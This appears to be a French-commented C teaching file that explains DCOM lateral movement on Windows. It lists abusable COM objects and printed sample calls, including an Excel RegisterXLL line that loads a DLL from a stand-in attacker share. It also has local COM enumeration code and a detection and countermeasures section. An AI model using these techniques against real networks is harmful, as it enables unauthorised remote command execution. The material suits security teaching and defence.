/*
 * OBJECTIF  : Mouvement lateral via DCOM (MMC20, ShellWindows, ShellBrowserWindow)
 * PREREQUIS : COM/DCOM basics, CoInitialize, IDispatch
 * COMPILE   : cl example.c /Fe:example.exe /link ole32.lib oleaut32.lib
 *
 * DCOM (Distributed COM) permet d'instancier des objets COM sur des machines distantes.
 * Certains objets COM exposent des methodes d'execution de commandes :
 * - MMC20.Application -> ExecuteShellCommand
 * - ShellWindows -> Navigate, Document.Application.ShellExecute
 * - ShellBrowserWindow -> Document.Application.ShellExecute
 * - Excel.Application -> RegisterXLL (charge une DLL)
 *
 * L'avantage : pas de service cree, pas de fichier copie, pas de PsExec.
 */

#include <windows.h>
#include <stdio.h>
#include <objbase.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

/* Demo 1 : Expliquer le DCOM lateral movement */
void demo_dcom_concept(void) {
    printf("[1] DCOM Lateral Movement - Concept\n\n");

    printf("    DCOM = Distributed COM\n");
    printf("    Permet d'instancier un objet COM sur une machine distante\n");
    printf("    via CoCreateInstanceEx() avec un COSERVERINFO\n\n");

    printf("    Flux :\n");
    printf("    1. Attaquant appelle CoCreateInstanceEx(CLSID, CIBLE)\n");
    printf("    2. DCOM se connecte au CIBLE via RPC (port 135 + ports dynamiques)\n");
    printf("    3. L'objet COM est cree dans le contexte de l'utilisateur authentifie\n");
    printf("    4. L'attaquant appelle des methodes sur l'objet distant\n");
    printf("    5. Certains objets permettent l'execution de commandes!\n\n");

    printf("    Prerequis :\n");
    printf("    - Credentials admin sur la cible\n");
    printf("    - DCOM active sur la cible (par defaut)\n");
    printf("    - Ports RPC ouverts (135 + dynamiques)\n\n");
}

/* Demo 2 : Initialisation COM locale */
void demo_com_basics(void) {
    printf("[2] Bases COM - Initialisation et utilisation locale\n\n");

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("    [-] CoInitializeEx echoue : 0x%08lX\n\n", hr);
        return;
    }
    printf("    [+] COM initialise\n");

    /* Initialiser la securite COM */
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                               RPC_C_AUTHN_LEVEL_DEFAULT,
                               RPC_C_IMP_LEVEL_IMPERSONATE,
                               NULL, EOAC_NONE, NULL);
    printf("    [+] CoInitializeSecurity : 0x%08lX\n", hr);

    /* Creer un objet Shell local pour demo */
    CLSID clsid;
    hr = CLSIDFromProgID(L"Shell.Application", &clsid);
    if (SUCCEEDED(hr)) {
        printf("    [+] Shell.Application CLSID resolu\n");

        IDispatch* pDisp = NULL;
        hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER,
                               &IID_IDispatch, (void**)&pDisp);
        if (SUCCEEDED(hr)) {
            printf("    [+] Shell.Application instancie localement\n");
            printf("    [*] En reel distant : CoCreateInstanceEx avec COSERVERINFO\n");
            pDisp->lpVtbl->Release(pDisp);
        } else {
            printf("    [-] CoCreateInstance echoue : 0x%08lX\n", hr);
        }
    }

    CoUninitialize();
    printf("\n");
}

/* Demo 3 : Objets DCOM exploitables */
void demo_exploitable_objects(void) {
    printf("[3] Objets DCOM exploitables pour le lateral movement\n\n");

    printf("    +---------------------------+----------------------------+----------------+\n");
    printf("    | Objet COM                 | Methode                    | CLSID          |\n");
    printf("    +---------------------------+----------------------------+----------------+\n");
    printf("    | MMC20.Application         | ExecuteShellCommand        | {49B2791A-...} |\n");
    printf("    | ShellWindows              | Item().Document.App.Shell  | {9BA05972-...} |\n");
    printf("    | ShellBrowserWindow        | Document.App.ShellExecute  | {C08AFD90-...} |\n");
    printf("    | Excel.Application         | RegisterXLL (load DLL)     | {00024500-...} |\n");
    printf("    | Outlook.Application       | CreateObject               | {0006F03A-...} |\n");
    printf("    | Visio.InvisibleApp        | ExecuteLine                | {000209FF-...} |\n");
    printf("    +---------------------------+----------------------------+----------------+\n\n");

    printf("    A) MMC20.Application :\n");
    printf("       mmc.ExecuteShellCommand(\"cmd.exe\", \"/c calc.exe\", \"\", \"7\")\n");
    printf("       -> Execute cmd.exe sur la cible\n\n");

    printf("    B) ShellWindows :\n");
    printf("       item = sw.Item()    // Explorer window\n");
    printf("       item.Document.Application.ShellExecute(\"cmd.exe\", \"/c whoami\")\n");
    printf("       -> Execute via une fenetre Explorer\n\n");

    printf("    C) Excel.Application :\n");
    printf("       excel.RegisterXLL(\"\\\\attacker\\share\\payload.dll\")\n");
    printf("       -> Charge une DLL (XLL) dans Excel\n\n");
}

/* Demo 4 : Simulation de l'appel DCOM distant (concept) */
void demo_remote_dcom(void) {
    printf("[4] Appel DCOM distant - Code conceptuel\n\n");

    printf("    /* Code pour instancier un objet sur une machine distante */\n\n");

    printf("    COSERVERINFO server_info = {0};\n");
    printf("    server_info.pwszName = L\"192.168.1.100\";  // Cible\n\n");

    printf("    MULTI_QI mqi = {0};\n");
    printf("    mqi.pIID = &IID_IDispatch;\n\n");

    printf("    /* Authentification (utilise les credentials courants ou passes) */\n");
    printf("    COAUTHINFO auth = {0};\n");
    printf("    auth.dwAuthnSvc = RPC_C_AUTHN_WINNT;    // NTLM\n");
    printf("    auth.dwAuthzSvc = RPC_C_AUTHZ_NONE;\n");
    printf("    auth.dwAuthnLevel = RPC_C_AUTHN_LEVEL_CONNECT;\n");
    printf("    auth.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;\n");
    printf("    server_info.pAuthInfo = &auth;\n\n");

    printf("    /* Creer l'objet MMC20.Application sur la cible */\n");
    printf("    CLSID clsid_mmc = {0x49B2791A, ...};\n");
    printf("    hr = CoCreateInstanceEx(&clsid_mmc, NULL, CLSCTX_REMOTE_SERVER,\n");
    printf("                             &server_info, 1, &mqi);\n\n");

    printf("    /* Appeler ExecuteShellCommand via IDispatch */\n");
    printf("    IDispatch* pDisp = (IDispatch*)mqi.pItf;\n");
    printf("    // ... GetIDsOfNames(\"ExecuteShellCommand\") + Invoke(...)\n\n");
}

/* Demo 5 : Enumerer les objets DCOM locaux */
void demo_enumerate_dcom(void) {
    printf("[5] Enumeration des objets DCOM enregistres\n\n");

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CLASSES_ROOT, "CLSID", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        printf("    [-] Impossible d'ouvrir HKCR\\CLSID\n\n");
        return;
    }

    DWORD index = 0;
    char subkey[256];
    DWORD subkey_len;
    int dcom_count = 0;

    printf("    Objets COM avec AppID (potentiellement DCOM-accessible) :\n\n");

    while (1) {
        subkey_len = sizeof(subkey);
        if (RegEnumKeyExA(hKey, index++, subkey, &subkey_len,
                           NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

        /* Verifier si cet objet a un AppID (= DCOM) */
        HKEY hSubKey;
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "CLSID\\%s", subkey);

        if (RegOpenKeyExA(HKEY_CLASSES_ROOT, full_path, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
            char appid[256] = {0};
            DWORD appid_len = sizeof(appid);
            if (RegQueryValueExA(hSubKey, "AppID", NULL, NULL,
                                  (LPBYTE)appid, &appid_len) == ERROR_SUCCESS) {
                if (dcom_count < 10) {
                    /* Lire le nom de l'objet */
                    char name[256] = {0};
                    DWORD name_len = sizeof(name);
                    RegQueryValueExA(hSubKey, NULL, NULL, NULL, (LPBYTE)name, &name_len);
                    printf("    %s  %s  AppID=%s\n", subkey,
                           name[0] ? name : "(sans nom)", appid);
                }
                dcom_count++;
            }
            RegCloseKey(hSubKey);
        }
    }

    RegCloseKey(hKey);
    if (dcom_count > 10) printf("    ... (%d de plus)\n", dcom_count - 10);
    printf("\n    [+] Total objets DCOM : %d\n\n", dcom_count);
}

/* Demo 6 : Detection */
void demo_detection(void) {
    printf("[6] Detection du DCOM lateral movement\n\n");

    printf("    Indicateurs reseau :\n");
    printf("    - RPC port 135 (endpoint mapper)\n");
    printf("    - Ports dynamiques RPC (49152+)\n");
    printf("    - Trafic DCOM inhabituel entre postes\n\n");

    printf("    Indicateurs hote :\n");
    printf("    - Sysmon Event ID 1 : processus lance par mmc.exe ou explorer.exe\n");
    printf("    - Parent process inattendu (mmc.exe -> cmd.exe)\n");
    printf("    - Event ID 4624 Logon Type 3 (Network)\n");
    printf("    - DCOM activation events (Event ID 10016)\n\n");

    printf("    Contre-mesures :\n");
    printf("    - Desactiver DCOM si non necessaire\n");
    printf("    - Firewall : bloquer RPC entre postes de travail\n");
    printf("    - Restreindre les permissions DCOM (dcomcnfg.exe)\n");
    printf("    - Monitorer les activations DCOM distantes\n\n");
}

int main(void) {
    printf("[*] Demo : DCOM Lateral Movement\n");
    printf("[*] ==========================================\n\n");

    demo_dcom_concept();
    demo_com_basics();
    demo_exploitable_objects();
    demo_remote_dcom();
    demo_enumerate_dcom();
    demo_detection();

    printf("[+] Exemple termine avec succes\n");
    return 0;
}
